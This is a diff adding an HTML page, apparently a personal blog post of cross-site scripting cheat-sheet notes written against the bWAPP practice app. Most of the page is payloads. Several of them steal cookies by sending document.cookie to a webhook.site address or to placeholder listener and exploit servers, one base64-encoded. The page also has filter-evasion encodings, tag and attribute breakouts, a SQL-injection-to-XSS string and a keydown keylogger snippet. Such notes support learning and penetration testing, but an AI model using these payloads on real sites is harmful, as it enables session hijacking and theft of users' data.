@@ -1,0 +1,218 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Mi Blog</title>
+  <link rel="stylesheet" href="file:///Users/b0ydc/Documents/CYBER/SITE/css/styles.css">
+</head>
+<body>
+  <header>
+    <h4 align="right">@b0ydC</h4>
+  </header>
+
+  <main>
+    <article>
+     
+<h2>1. GENERAL TECHNIQUES</h2>  
+
+<code>          
+
+C1: &lt;script&gt;var i = new Image;i.src="LISTENER URL/?"+document.cookie;&lt;&sol;script&gt;<br><br>
+
+SAMPLE: &lt;script&gt;var i = new Image;i.src="https://webhook.site/#!/d88f22e7-9e44-47e8-9508-edeb3406d1cd/?"+document.cookie;&lt;&sol;script&gt;<br><br>
+
+NOTE:<br> <br>
+- Do not remove the /? symbols, they allow to use the "document.cookie" as parameter. <br><br>
+
+CASE_1: Sometimes some characters are not allowed and encode techniques are needed, JS accepts decimal unicode characters. If it is still 
+failing [HTTP 403 "maybe"] a quick change is to add zeros to the encoded value, JS will interpret the value as it is. <br><br>
+
+SAMPLE: Let's say, the character ( is not allowed, the decimal unicode value is &#40, so adding extra zeros will look like the 
+following:&#0000000040 <br><br>
+
+TIP: if trying with hyperlinks, images, frames, etc. does not work, take a look to the string probably there's some filtering on the word that is 
+blocking the attempt.
+
+</code>         
+
+<h2>2. REFLECTED TECHNIQUES</h2>  
+
+<code>
+
+INFO: It is when data is retrieved in the webpage without any restriction. So it can be used to exfiltrate information, stole data, etc.<br><br>
+
+NOTE:<br> <br>
+-It is important to analyze if exist some code behind performing actions, check if you can analyze the syntax/format to close the query. <br>
+The following sample is closing two sections of the query,  "}]}'; and &lt;&sol;script&gt;<br>
+-Try to add a new header, that will reflect if allows custom headers or not. | bWAPP: &lt;script&gt;alert(1)&lt;&sol;script&gt;<br><br>
+
+SAMPLE:<br><br>
+
+&lt;&sol;script&gt;var JSONResponseString = '{"movies":[{"response":"test??? Sorry, we don't have that movie :("}]}';<br><br>
+
+COMMON TESTS:<br><br>   
+  
+C1: &lt;h1&gt;TEST&lt;&sol;h1&gt;<br> 
+C2: &lt;script&gt;alert('XSS');&lt;&sol;script&gt; | C1 & C2, NORMAL TEST TO KNOW IF VULNERABILITY EXIST <br>
+C3: &lt;script&gt;alert(document.cookie);&lt;&sol;script&gt; | NORMAL TEST TO RETRIEVE COOKIES<br>
+C4: &lt;script&gt;fecth('http://IP_ADDR/&dollar;&lcub;btoa(document.cookie)}');&lt;&sol;script&gt;  | STOLE ENCODED BASE64 COOKIE<br>
+C5: &lt;script&gt;confirm(document.domain);&lt;&sol;script&gt;  <br><br>
+    
+- for this to work, it is needed a python server or any listener to retrieve the content.</code><br><br>
+
+<u>INTO AN ATTRIBUTE</u><br><br>
+
+<code>
+
+C1: "onmouseover="alert(1)<br><br>
+
+NOTE:<br> <br>
+- As soon as you move the mouse over the vulnerable tag, it will pop-up the alert function. General inspection it's needed, manual 
+review of behavior of input fields. If it is showing input data, how it behaves, what can he imported, etc.</code><br><br>
+
+<u>INTO AN JAVASCRIPT STRING</u><br><br>
+
+<code>
+
+NOTE:<br> <br>
+- Headers inspection is needed, [burpsuite > repeater]. Analyze the code and what it is doing, if it is receiving via parameters some 
+payloads can be used to escape.<br><br> 
+  
+C1: &apos;-alert&lpar;1&rpar;-&apos;</code><br><br>
+
+<u>INTO AJAX/XML</u><br><br>
+
+<code>
+
+C1: &lt;img src='#' onerror='alert(1)&apos;&gt;</code><br><br>
+
+<u>EVAL FUNCTION</u><br><br>
+
+<code>
+
+SAMPLE: http://192.168.37.129/bWAPP/xss_eval.php?date=Date()<br><br>
+
+Here it will depends but is only needed to add a script tag into the Date() function. If security if broken, it will pop-up an alert. </code><br><br>
+
+<u>HREF</u><br><br>
+
+<code>
+
+Here it will depends based on where the HREF is located, however, it is really important to analyze the syntax/format of the query, 
+check if exist some way to close the query to append the XSS command. Also, the referer HTML tag is a good option to test. 
+Check sample,<br><br>
+
+SAMPLE:<br><br>
+
+&lt;td align="center"> &lt;a href=xss_href-3.php?movie=1&name=TEST&action=vote>Vote&lt;/a>&lt;/td><br><br>
+  
+ATTACK: http://192.168.37.129/bWAPP/xss_href-2.php?name=TEST>&lt;script&gt;alert('XSS')&lt;&sol;script&gt;&action=vote <br><br>
+
+If you check, the HREF is part of a column in a table as it is using the td HTML tag, you can confirm checking where is located 
+the word TEST. So, here you can close the a href tag and append the script tag. This will do a XSS attempt, as the 
+script HTML tag is added. </code> <br><br>
+
+<u>SQLi to XSS</u><br><br>
+
+<code>
+
+SAMPLE: ' or 1=1; &lt;script>alert('TOME')&lt;/script></code><br><br>
+
+<u>XSS to CSRF</u><br><br>
+
+<code>
+
+It can be reflected or stored.<br><br>
+
+-->TEST VIA DEV TOOLS<br><br>
+
+1. Open dev-tools in your browser > go to console.<br>
+2. Type: alert(1) | print() | prompt("hello")<br><br>
+
+<u>CREATE A LOG FUNCTION TO STORE/RETRIEVE DATA USING XSS</u><br><br>
+
+step1>$ function logKey(event){console.log(event.key)}<br><br>
+
+step2>$ document.addEventListener('keydown', logKey)
+
+</code>  
+
+<h2>3. STORED TECHNIQUES</h2>  
+
+<code>
+
+INFO: It is when data (exploit) is stored in the webpage without any restriction. So it can be used to exploit any user that loads 
+the vulnerable page.<br><br>
+
+NOTE:<br><br>
+1. First thing, check if the site allows guest user post or any input post to be stored. <br>
+2. Is there any "hidden" fields ? Check if the query can be closed.<br>
+3. Check cookies, confirm if there's no "Set-Cookie:" parameters.</code><br><br>
+
+<u>INTO AN HREF ATTRIBUTE</u><br><br>
+
+<code>
+
+1. Check how the application behaves when you are providing some input data. [always inspect headers]<br>
+2. href attribute can invoke javascript code.<br><br>
+
+SAMPLE: javascript:alert(1) </code><br><br>
+
+<u>EXTERNAL XSS</u><br><br>
+  
+<code>
+
+C2: &lt;script&gt;document.location='//EXPLOIT_SERVER_URL/'+document.cookie&lt;&sol;script&gt;<br><br>
+
+NOTE:<br> <br>
+- Payload can be used to retrieve the cookie from external sites.
+
+</code>          
+
+<h2>4. DOM TECHNIQUES</h2>  
+
+...
+
+
+<h2>5. MARKDOWN XSS</h2> 
+
+<code>
+
+hacktricks cheatsheet can help with the discovery of the vulnerability. the most common test or way to exploit it is to use hyperlinks as with 
+hyperlinks you can add more functionality like onmouseover, onclick, etc. however there are more to use it.<br><br>
+
+-hyperlinks<br>
+-images<br><br>
+
+tip: best way to work trying to find the XSS vulnerability is to use the browser.
+
+</code>
+
+<h2>6. ENCODED PAYLOADS TECHNIQUES</h2> 
+
+<code>
+
+&lt;script &lt;script&gt;&gt;alert&lpar;&apos;l33t&apos;&rpar;&lt;&sol;script&gt;<br>
+
+&lt;img&sol;src onerror&equals;alert&lpar;&apos;l33t&apos;&rpar;&gt;<br>
+  
+&lt;svg&gt;&lt;script&gt;alert&lpar;&apos;l33t&apos;&rpar;<br>
+  
+&lt;svg&gt;&lt;script&gt;alert&amp;lpar&semi;&apos;l33t&apos;&amp;rpar&semi;<br>
+  
+&lt;script&gt;&bsol;u0061lert&lpar;&apos;l33t&apos;&rpar;&lt;&sol;script&gt;<br>
+  
+&lt;script&gt;eval&lpar;&apos;&bsol;x61lert&lpar;&bsol;&apos;l33t&bsol;&apos;&rpar;&apos;&rpar;&lt;&sol;script&gt;<br>
+  
+&lsqb;NL&rsqb;eval&lpar;&apos;&bsol;x61lert&lpar;&bsol;&apos;l33t&bsol;&apos;&rpar;&apos;<br>
+  
+&lt;script&gt;eval&lpar;8680439&period;&period;toString&lpar;30&rpar;&rpar;&lpar;983801&period;&period;toString&lpar;36&rpar;&rpar;&lt;&sol;script&gt;<br>
+
+&lt;h1 onauxclick=confirm(document.domain)&gt;RIGHT CLICK HERE || https://hackerone.com/reports/1779447<br>
+
+</code>
+    </article>
+  </main>
+</body>
+</html>
